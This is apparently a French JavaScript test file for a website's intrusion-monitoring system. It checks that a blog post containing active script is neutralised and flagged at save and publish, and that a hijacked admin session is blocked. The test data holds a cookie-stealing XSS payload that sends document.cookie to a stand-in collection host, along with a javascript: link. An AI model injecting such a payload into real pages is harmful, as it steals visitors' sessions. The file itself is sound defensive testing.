// Famille « Carnets » (registre des briques BV-12 ; vigie/regles/85-galeries-carnets.yml) : le rendu d'un billet
// neutralise les constructions actives (script, attributs on…, javascript:) ; le site le signale à l'enregistrement, à la
// proposition, à la publication, jamais à l'aperçu ni à l'enregistrement automatique (l'auteur est en train d'écrire).

const JULIEN = 'local:julien';
const ACTIF = 'Le fleuve.\n\n<script>fetch("https://collecte.example/?c="+document.cookie)</script>\n\n[Voir](javascript:alert(1))';

async function nouveauBillet(b, eq, titre) {
  const cree = await eq.ecrire('/admin/carnet', { title: titre, rubrique: 'voyages' });
  const id = /\/admin\/carnet\/(\d+)/.exec(cree.location || '')?.[1];
  if (!id) throw new Error(`billet non créé (${cree.status})`);
  return id;
}

export default [
  {
    nom: 'billet-construction-active',
    famille: 'carnets',
    titre: 'Billet contenant un script : aperçu, enregistrement, publication',
    cas: ['DS11'],
    resume: 'L’administrateur (compte volé, ou traduction collée) colle un script dans un billet : d’abord à l’aperçu, puis il l’enregistre et le publie.',
    // Les Carnets sont publics avec la version 2 du site : réglée dans la base de départ.
    preparerBase(db) { db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES ('public_version', ?)").run(JSON.stringify('v2')); },
    async jouer(b) {
      const id = await nouveauBillet(b, b.julien, 'Brume et lumière');
      const ap = await b.julien.ecrireJson(`/admin/carnet/${id}/apercu`, { langue: 'fr', body: ACTIF });
      b.constat('aperçu', 'aperçu rendu (200)', ap.status === 200, String(ap.status));
      await b.verifier('aperçu', [{ pasAlerte: 'sigma.billet_construction_active', note: 'jamais à l’aperçu (BV-12)' }, { pasAlerte: 'sigma.saisie_compte_admin', note: 'le corps d’un aperçu n’est pas lu comme une saisie brute (vigie.corps = rendu)' }]);
      const photo = b.banc.db.prepare("SELECT id FROM photos WHERE status = 'published' ORDER BY id LIMIT 1").pluck().get();
      const en = await b.julien.ecrire(`/admin/carnet/${id}`, { langue: 'fr', title: 'Brume et lumière', dek: 'Un matin sur le fleuve.', body: `${ACTIF}\n\nphoto:${photo}` });
      b.constat('enregistrement', 'billet enregistré (303)', en.status === 303, String(en.status));
      await b.verifier('enregistrement', [{ alerte: 'sigma.billet_construction_active', entite: `compte:${JULIEN}`, gravite: 'moyen', mode: 'alerter' }]);
      const pub = await b.julien.ecrire(`/admin/carnet/${id}/publier`, { langue: 'fr' });
      const etat = b.banc.db.prepare('SELECT state FROM posts WHERE id = ?').pluck().get(Number(id));
      const page = etat === 'publie' ? await b.nav({ ip: '198.51.100.40', ua: b.UA.iphone }).get(`/carnet/${b.banc.db.prepare('SELECT slug FROM posts WHERE id = ?').pluck().get(Number(id))}`) : null;
      b.constat('publication', 'publié, et la page publique ne contient aucun script', etat === 'publie' && page?.status === 200 && !/<script>fetch/.test(page.texte) && !/javascript:alert/.test(page.texte), `${pub.status}, état ${etat}, page ${page?.status ?? '-'}`);
      await b.verifier('publication', [{ pasAlerte: 'sigma.saisie_compte_admin' },
        { alerte: 'sigma.texte_public_contact', entite: `compte:${JULIEN}`, note: 'le billet publié gagne un lien externe (l’adresse de collecte du script) : BV-20' }]);
    },
  },
  {
    nom: 'billet-apres-session-reprise',
    famille: 'carnets',
    titre: 'Session de l’admin reprise depuis un autre appareil, puis script dans un billet',
    cas: ['DS2', 'DS23'],
    resume: 'Le cookie de Julien est copié ; l’attaquant l’utilise depuis un autre pays et un autre navigateur ; la Vigie redemande '
      + 'l’identité du compte : le billet piégé n’est pas enregistré.',
    async jouer(b) {
      const id = await nouveauBillet(b, b.julien, 'Les quais');
      const vol = b.equipe({ ip: '203.0.113.42', ua: b.UA.android, pays: 'BR' }).copierCookies(b.julien);
      await vol.lireCsrf();
      b.constat('reprise', 'la session volée ouvre l’admin', Boolean(vol.csrf), vol.csrf ? 'jeton CSRF lu' : 'pas de jeton');
      // Réponse douce de session_autre_appareil (mode « bloquer », décision du propriétaire du 19 octobre 2026).
      await b.verifier('reprise', [{ alerte: 'sigma.session_autre_appareil', entite: `compte:${JULIEN}`, gravite: 'critique', mode: 'bloquer' },
        { decision: 'verifier_identite', cible: JULIEN }, { pasDecision: 'revoquer_compte' }]);
      const r = await vol.ecrire(`/admin/carnet/${id}`, { langue: 'fr', title: 'Les quais', body: ACTIF });
      const corps = JSON.stringify(b.banc.db.prepare('SELECT * FROM posts WHERE id = ?').get(Number(id)) || {});
      b.constat('script', 'billet piégé arrêté : nouvelle connexion demandée, rien d’enregistré', r.status === 303 && /^\/auth\/verifier\?/.test(r.location || '') && !/collecte\.example/.test(corps), `${r.status} → ${r.location}`);
      await b.verifier('script', [{ pasAlerte: 'sigma.billet_construction_active', note: 'rien n’est rendu : l’écriture n’a pas eu lieu' },
        { pasAlerte: 'sigma.billet_apres_session_reprise', note: 'corrélation gardée (mode bloquer, même réponse) pour une écriture passée avant la décision' }]);
    },
  },
];
